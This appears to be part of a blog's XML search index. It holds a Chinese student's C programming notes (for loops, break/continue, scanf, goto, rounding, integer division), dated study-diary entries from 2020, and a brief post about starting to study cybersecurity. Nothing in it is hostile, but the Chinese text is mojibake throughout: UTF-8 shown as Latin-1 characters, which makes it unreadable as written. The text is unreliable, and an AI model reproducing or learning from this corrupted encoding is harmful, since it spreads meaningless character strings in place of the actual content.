<p>21ã€for(è¡¨è¾¾å¼1ï¼›è¡¨è¾¾å¼2ï¼›è¡¨è¾¾å¼3)ç±»å‹é‡Œé¢çš„ä¸‰ä¸ªè¡¨è¾¾å¼éƒ½èƒ½ä¸ªåˆ«çœç•¥ï¼Œ  åŒæ—¶å¾ªç¯ä½“å¯ä»¥æ”¾è¿›ç¬¬ä¸‰ä¸ªè¡¨è¾¾å¼ä¸­ï¼Œä½†æ˜¯<em><strong>â€œï¼›â€ä¸èƒ½çœç•¥ï¼Œæ‹¬å·é‡Œé¢ä¸€å®šè¦æœ‰ä¸¤ä¸ªâ€œï¼›â€</strong></em>å¹¶ä¸”éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœçœç•¥äº†è¡¨è¾¾å¼ï¼Œé‚£ä¹ˆå¾ªç¯åœæ­¢çš„æ¡ä»¶ä¸€å®šè¦åœ¨å¾ªç¯ä½“å†…åˆ—å‡ºï¼Œå¦åˆ™å°†æ˜¯æ— é™å¾ªç¯ã€‚</p>
<p>22ã€å½“ç”¨forç±»å‹è¿›è¡Œå¾ªç¯åµŒå¥—æ—¶ï¼Œç¬¬ä¸€ä¸ªforä¸­æ‰§è¡Œçš„å˜é‡è¿›å…¥ç¬¬äºŒä¸ªforæ—¶ï¼Œç¬¬äºŒä¸ªforä¸­å˜é‡å€¼éƒ½ä¼šä»æœ€å¼€å§‹è®¾ç½®çš„å€¼å¼€å§‹è¿›è¡Œå¾ªç¯</p>
<p>23ã€å½“æŸç»“æ„åé¢éœ€è¦æ‰§è¡Œçš„è¯­å¥ä¸æ­¢ä¸€æ¡æ—¶ç”¨èŠ±æ‹¬å·å°†æ‰€æœ‰è¯­å¥åŒ…å«</p>
<p>24ã€å½“è¯­å¥ä¸­åµŒå¥—å¤šç§è¯­å¥æ—¶ï¼Œä¸€å®šè¦æ³¨æ„å†™æ¸…æ¥šï¼Œåˆ†éš”å¥½ï¼Œä¸ç„¶æˆ–è®¸è¿è‡ªå·±æŸ¥çœ‹éƒ½ä¼šå‡ºç°éšœç¢</p>
<p>25ã€breakåªèƒ½åœ¨<strong>å¾ªç¯è¯­å¥å’Œswitchè¯­å¥</strong>ä¸­ä½¿ç”¨ï¼Œåœ¨å¾ªç¯è¯­å¥ä¸­ç”¨æ¥è·³å‡ºå½“å‰å¾ªç¯ï¼ˆéœ€è¦ä¸ifè¿ç”¨ï¼‰ï¼Œåœ¨switchåªèƒ½ç»“æŸå•å¥è¯­å¥</p>
<p>26ã€continueåªèƒ½ç”¨äº<strong>å¾ªç¯è¯­å¥</strong>ï¼Œä¸ifè¿ç”¨ï¼Œå¦‚æœifè¯­å¥æ¡ä»¶æ»¡è¶³ä¸ºçœŸï¼Œç¨‹åºå°†ä¸ä¼šè¿è¡Œè‡³continueä¹‹åçš„è¯­å¥ï¼Œè€Œæ˜¯è¿›å…¥ä¸‹ä¸€æ¬¡çš„å¾ªç¯ã€‚</p>
<p>27ã€scanfä¸­çš„éæ³•è¾“å…¥è¦æ³¨æ„ï¼Œè™½ç„¶çœ‹ä¼¼å¯èƒ½æ˜¯ä¸€ç§é”™è¯¯ï¼Œä½†æœ‰æ•ˆçš„å°†ä¹‹è¿ç”¨ï¼Œä¹Ÿèƒ½è®©å…¶ä¸ºæˆ‘ä»¬åˆ›é€ æ›´å¤šçš„è¾“å…¥</p>
<p>28ã€å¯ç”¨ä¸€äº›æ ‡è¯†ç¬¦ï¼ˆä¸èƒ½æ˜¯å…³é”®è¯ï¼‰åŠ â€œ: â€æ”¾åœ¨è¯­å¥å‰ï¼Œè¿›è¡Œæ³¨é‡Šï¼Œæ³¨é‡Šåå¯ä»¥ç”¨<strong>goto æ ‡è¯†ç¬¦</strong> æ‰§è¡Œåœ¨å…¶å†’å·ä¹‹åçš„è¯­å¥ï¼ˆä¸å»ºè®®ä½¿ç”¨ï¼Œç ´åæ¨¡å—åŒ–çš„ç»“æ„é¡ºåºï¼‰</p>
<p>29ã€å¯¹äºç›¸åŒçš„ä¸€ä¸ªå¾ªç¯é—®é¢˜ï¼Œå¯ä»¥å¤šæƒ³æƒ³æ˜¯å¦èƒ½ç”¨ä¸åŒçš„å¾ªç¯è¯­å¥å»å®Œæˆï¼Œå¯ä»¥è·å¾—æ›´å¤šçš„æ€è€ƒ</p>
<p>30ã€å¯¹äºå¾ªç¯åµŒå¥—å¾ªç¯çš„ç»“æ„ï¼Œæ³¨æ„é‡è¦ä¸€ç‚¹ï¼Œä¹Ÿæ˜¯å®¹æ˜“æé”™çš„åœ°æ–¹ï¼šåªæœ‰å†…å±‚çš„å¾ªç¯ç»“æŸæ—¶ï¼Œæ‰ä¼šå†ç»§ç»­æ‰§è¡Œå¤–å±‚çš„å¤§å¾ªç¯</p>
<p>31ã€å½“ä½¿ç”¨whileï¼ˆ1ï¼‰æ— é™å¾ªç¯çš„è¯­å¥æ—¶ï¼Œè‹¥æ˜¯åœ¨å†…éƒ¨æœ‰ä½¿ç”¨å¤šä¸ªè¾“å…¥å‡½æ•°è¿›è¡Œå–å€¼ï¼Œå¹¶ä¸”æœ‰äº›å–çš„ç±»å‹ä¸ºå­—ç¬¦æ—¶éœ€è¦åœ¨å…¶åé¢æ·»åŠ ä¸€ä¸ªgetcharï¼ˆï¼‰æ¥ç››æ”¾ä½ ä¹‹å‰è¾“å…¥çš„å›è½¦é”®è¿™ä¸ªå­—ç¬¦</p>
<p>32ã€å¯¹äºå‡½æ•°å®šä¹‰å˜é‡çš„ç²¾åº¦ä¸€å®šè¦ä¸å…¶ä½¿ç”¨scanfå‡½æ•°é‡Œé¢çš„ç²¾åº¦ä¸€è‡´ï¼Œå¦åˆ™å°†å‡ºé”™</p>
<p>33ã€ä»€ä¹ˆæ—¶å€™ç”¨å¾ªç¯è¯­å¥ï¼Ÿå½“æœ‰å¤šä¸ªä¸œè¥¿ç±»å‹ç›¸ä¼¼éœ€è¦é‡å¤åšå¤šæ¬¡çš„ï¼Œå¯ä»¥æƒ³æƒ³å¾ªç¯è¯­å¥èƒ½ä¸èƒ½ç”¨ä¸Šï¼Œå°†å¯ä»¥ç®€åŒ–ä»£ç </p>
<p>34ã€ä»€ä¹ˆæ—¶å€™ç”¨åµŒå¥—å¾ªç¯ï¼ˆä¸€èˆ¬ä¸ºåŒé‡å¾ªç¯è¯­å¥ï¼‰ï¼Ÿå½“æ¶‰åŠä¸¤ä¸ªéœ€è¦æ”¹å˜çš„ä¸œè¥¿çš„æ—¶å€™ï¼Œæ¯”å¦‚ä¸¤ä¸ªæ–¹ä½ï¼Œä¸¤ä¸ªå˜é‡ç­‰ç­‰</p>
<p>35ã€if(   )  åé¢è·Ÿçš„è¯­å¥å¯ä»¥ä¸ºç©ºè¯­å¥ï¼Œå³ä»€ä¹ˆéƒ½ä¸è¾“å…¥ï¼Œè¡¨ç¤ºç©ºè¯­å¥</p>
<p>36ã€cè¯­è¨€ä¸­ï½›ï½åé¢æœ‰ç¬¦å·çš„æƒ…å†µï¼š</p>
<p>ï¼ˆ1ï¼‰ç»“æ„ä½“ã€å…±ç”¨ä½“ã€æšä¸¾ç±»å‹çš„èŠ±æ‹¬å·åé¢è¦åŠ åˆ†å·</p>
<p>ï¼ˆ2ï¼‰åœ¨äºŒç»´æ•°ç»„çš„åˆå§‹åŒ–é‡Œé¢åˆ†è¡Œè¿›è¡Œåˆå§‹åŒ–çš„èŠ±æ‹¬å·åé¢è¦åŠ é€—å·</p>
<p>37ã€cè¯­è¨€å¦‚æœæ˜¯è¾“å‡ºç»“æœè¦æ±‚å››èˆäº”å…¥ï¼Œé‚£ä¹ˆå¯ä»¥åœ¨printfå‡½æ•°ä¸­çš„å¦‚dã€få‰åŠ ä¸Š .a(aä¸ºä¿ç•™çš„å°æ•°ä½æ•°)ï¼›å¦‚æœæ˜¯åœ¨é€”ä¸­çš„å˜é‡å››èˆäº”å…¥ï¼Œåˆ™éœ€è¦å¼ºåˆ¶ç±»å‹è½¬æ¢åŠ 0.5çš„åšæ³•</p>
<p>38ã€å¯¹äº/ï¼Œå†æ¬¡è¿›è¡Œè¯¦ç»†è¯´æ˜ï¼Œå¯¹äºå€¼æ˜¯æ•´æ•°çš„å˜é‡ï¼Œæ²¡åŠæ³•åƒæ•°å­—é‚£æ ·ç›´æ¥åŠ ä¸ªå°æ•°ç‚¹ï¼Œæ­¤æ—¶å¯ä»¥æ¢ä¸€ç§æ€è·¯ï¼Œå°±æ˜¯ä¹˜æˆ–é™¤ä»¥1.0ï¼ˆæ³¨æ„è¿ç®—é¡ºåºï¼ï¼‰å°±å¯ä»¥å¾—åˆ°æµ®ç‚¹å‹çš„ç»“æœ</p>
<h2 id="äºŒã€å­¦ä¹ æ„Ÿæƒ³"><a href="#äºŒã€å­¦ä¹ æ„Ÿæƒ³" class="headerlink" title="äºŒã€å­¦ä¹ æ„Ÿæƒ³"></a>äºŒã€å­¦ä¹ æ„Ÿæƒ³</h2><p>Dateï¼š2020.10.03 </p>
<p>ä½œä¸ºä¸€ä¸ªç¡®ç¡®å®å®çš„é›¶åŸºç¡€å°ç™½ï¼Œæˆ‘å…ˆä»cè¯­è¨€æ•™æåŸºç¡€è¿™æœ¬ä¹¦å¼€å§‹è®¤çœŸçœ‹ï¼Œé‚£å¥hello worldçš„ç¨‹åºï¼ŒåŠ ä¸Šåé¢çš„å‡ ä¸ªç¨‹åºï¼Œä¸€ç‚¹ä¸€ç‚¹çš„ç†è§£è¿™äº›å¯¹æˆ‘æ¥è¯´éƒ½æ˜¯å…¨æ–°çš„ä¸œè¥¿ï¼Œä»å¼€å¤´é¢„å‘½ä»¤ï¼Œåˆ°å‡½æ•°å¤´ï¼Œå‡½æ•°åï¼Œæœ€åè¯­å¥ï¼Œæ‰ç®—æ˜¯å¯¹cæœ‰äº†é‚£ä¹ˆäº›è®¸ç†è§£ï¼Œè€Œè¿™äº›ç«Ÿç„¶å°±èŠ±å»äº†æˆ‘åˆè®¡ä¸€å¤©å·¦å³çš„æ—¶é—´ï¼Œæ„Ÿå¹è‡ªå·±å¤©èµ„æ„šé’ï¼ˆè½æ³ªï¼‰ã€‚</p>
<p>Dateï¼š2020.10.08</p>
<p>æ„Ÿè§‰è¿™å‡ å¤©æœ‰äº›æ‡ˆæ€ ï¼Œæ˜¯å› ä¸ºå­¦å®Œäº†åŸºç¡€æ•™ç¨‹çš„ç¬¬ä¸€ç« ï¼Œå®Œæˆäº†ä¸€ä¸ªå°ç›®æ ‡è€Œæ‡ˆæ€ çš„å—ï¼Ÿæˆ‘è§‰å¾—è¿™æ ·ä¸è¡Œï¼Œä»Šå¤©è¯¥é‡å›çŠ¶æ€ï¼Œæ‰€ä»¥ç‰¹æ„æ—©èµ·èµ¶å»å­¦ä¹ ã€‚å‘ç°ï¼Œç¡®å®æˆ‘è¿˜æœ‰å¾ˆå¤šå¾ˆå¤šå¾ˆå¤šå¾ˆå¤šï¼ˆçœç•¥nå­—ï¼‰ä¸æ‡‚ï¼Œä¸è¿‡è¿™æ‰æ›´æœ‰æ„æ€ï¼ŒæŒæ¡çŸ¥è¯†çš„æ„Ÿè§‰åœ¨æˆ‘çœ‹æ¥æ˜¯ååˆ†æ„‰æ‚¦çš„ã€‚</p>
<p>Dateï¼š202010.09</p>
<p>ç¬¬ä¸€ä¸ªåŒä¼‘å‰çš„æ™šä¸Šï¼Œæˆ‘é€‰æ‹©åœ¨å®è®­å®¤åº¦è¿‡ï¼Œä¹‹åçš„ä¸¤å¤©ä¹Ÿæ˜¯ï¼Œå“ˆå“ˆå“ˆï¼Œå¥½å§ï¼Œç¡®å®å­¦çš„ä¸œè¥¿å¥½å¤šï¼Œæ„Ÿè§‰è‡ªå·±å­¦ä¸ä¼šï¼Œæ²¡ä»€ä¹ˆå¤©èµ‹ã€‚æ¥è¿™å‘å‘ç‰¢éªšã€‚åŠ æ²¹ï¼ç„¶åå°±æ˜¯&amp;ï¼ˆå–åœ°å€ï¼‰ï¼Œ\nè¿™ä¸¤ä¸ªç¬¦å·å®¹æ˜“å¿˜è®°ï¼Œå¯¼è‡´ç¨‹åºè¿è¡Œæœ‰è¯¯</p>
<p>Dateï¼š2020.10.11</p>
<p>è¿™æ¬¡å­¦ä¹ ï¼Œåªç”¨äº†ä¸€ä¸ªåŠå°æ—¶å°±æŠŠç¬¬äºŒç« å­¦å®Œäº†ï¼Œæ¯”èµ·ä¹‹å‰å¿«å¤šäº†ï¼ˆå†…å®¹è¾ƒä¸ºç®€å•ï¼Œå¤šæ˜¯éœ€è¦è®°è¯µçš„å†…å®¹ï¼‰ï¼Œä¸è¿‡åº”è¯¥æ²¡æŒæ¡å¾ˆå¥½ï¼Œåé¢è·Ÿç»ƒä¹ ç†Ÿæ‚‰å§ï¼Œæˆ‘æƒ³åœ¨ä¸¤ä¸‰å‘¨æ—¶é—´ä¹‹å†…æŠŠcè‡ªè¡Œç»“æŸäº†ï¼Œå› ä¸ºæœ‰å¤ªå¤šçš„ä¸œè¥¿ç­‰ç€æˆ‘å»ä¸€ä¸€æ‘¸ç´¢ï¼Œè™½ç„¶æƒ³èµ·æ¥å¾ˆç´¯ï¼Œä½†æˆ‘ç«Ÿç„¶è§‰å¾—å…´å¥‹ï¼Ÿå¯èƒ½è¿™å°±æ˜¯çƒ­çˆ±å§ï¼Ÿç¬¬ä¸€æ¬¡å¯¹æŸä¸ªç®—æ˜¯å­¦ä¹ çš„äº‹ç‰©è¿™ä¹ˆä¸Šå¿ƒï¼Œæˆ‘æœŸå¾…æˆ‘ä¹‹åçš„è¡¨ç°</p>
<p>Dateï¼š2020.10.15</p>
<p>ä»Šå¤©æ€»ç®—ç»“æŸäº†ç¬¬ä¸‰ç« å­¦ä¹ ï¼Œè¯´å®è¯ï¼Œè¿™ç« çš„å¾ªç¯è¯­å¥ä¸é€‰æ‹©è¯­å¥å…¶å®è¿˜å¥½ï¼Œå°±æ˜¯éœ€è¦è®°ä½ä¸€äº›æ ¼å¼ä¸Šçš„ä¸œè¥¿ï¼Œç†è§£è¿˜æ˜¯ä¸éš¾ï¼Œéš¾ç‚¹åº”è¯¥åœ¨äºå¤šç§è¯­å¥çš„å±‚å±‚åµŒå¥—ï¼Œå±å®ä¸ºéš¾äººï¼Œå¤´å‘éƒ½æ‰äº†ä¸å°‘ï¼ˆè‹¦ç¬‘ï¼‰ï¼Œç»§ç»­åŠªåŠ›å§ï¼Œ</p>
<p>Dateï¼š2020.11.9</p>
<p>ä»Šå¤©æ‰ç®—æ˜¯å‹‰å¼ºå®Œæˆäº†æ•´æœ¬cè¯­è¨€çš„å­¦ä¹ å§ï¼Œä¸è¿‡èµ„è´¨æ„šé’çš„æˆ‘ï¼Œä¹Ÿå°±æ˜¯æ‡‚äº†ä¸€äº›è¯­æ³•ï¼ŒçŸ¥é“ä¸€äº›ä¸œè¥¿ï¼Œå…¶ä»–çš„æ–¹é¢ï¼Œä»ç„¶æ˜¯ä¸ªå°ç™½ã€‚å®³ï¼ŒæŒºç´¯çš„å…¶å®ï¼Œä¸è¿‡å¾ˆå……å®ï¼Œå’Œä»¥å‰æµ‘æµ‘å™©å™©çš„ç”Ÿæ´»ä¸åŒï¼Œæˆ‘è§‰å¾—ï¼Œå¤§å­¦ï¼Œæˆ‘è¯¥å‡ºå‘çš„ï¼Œä¹Ÿæƒ³æˆä¸ºä¸ä¼—ä¸åŒçš„äººï¼</p>
]]></content>
      <tags>
        <tag>å­¦ä¹ cæ—¶çš„ä¸€äº›ç¬”è®°ä¸å¿ƒå¾—</tag>
      </tags>
  </entry>
  <entry>
    <title>æ–°ç”Ÿ</title>
    <url>/2020/09/30/2020-09-30-%E6%96%B0%E7%94%9F/</url>
    <content><![CDATA[<p>  å¾ˆé«˜å…´ï¼Œæ€»å…±å†æ—¶åäº”å°æ—¶å·¦å³çš„æ—¶é—´ï¼Œæ€»ç®—åˆ›é€ äº†å±äºæˆ‘çš„ç®€é™‹çš„åšå®¢ï¼Œæ„ŸåŠ¨æ³ªç›®Â·dogeÂ·<br>å°†ä¹‹å‘½åä¸ºæ–°ç”Ÿï¼Œæ˜¯å› ä¸ºåœ¨æ­¤å‰ä»æœªæ¥è§¦è¿‡ï¼Œè¿›å…¥ä¸€ä¸ªå…¨æ–°çš„é¢†åŸŸï¼Œè¿›è¡Œå­¦ä¹ ï¼Œæ­¤åˆ»çš„æˆ‘å°±<br>åƒä¸€ä¸ªåˆç”Ÿçš„å©´å„¿èˆ¬ï¼Œåœ¨ç½‘å®‰è¿™ä¸ªèˆå°ä¸Šé‡ç”Ÿã€‚ä¹‹åä¾¿æ˜¯å­¦ä¹ ï¼Œå­¦ä¹ ï¼Œå­¦ä¹ ï¼å¼ºå¤§è‡ªå·±ï¼Œä»¥æ­¤çºªå¿µå§</p>
]]></content>
  </entry>
</search>
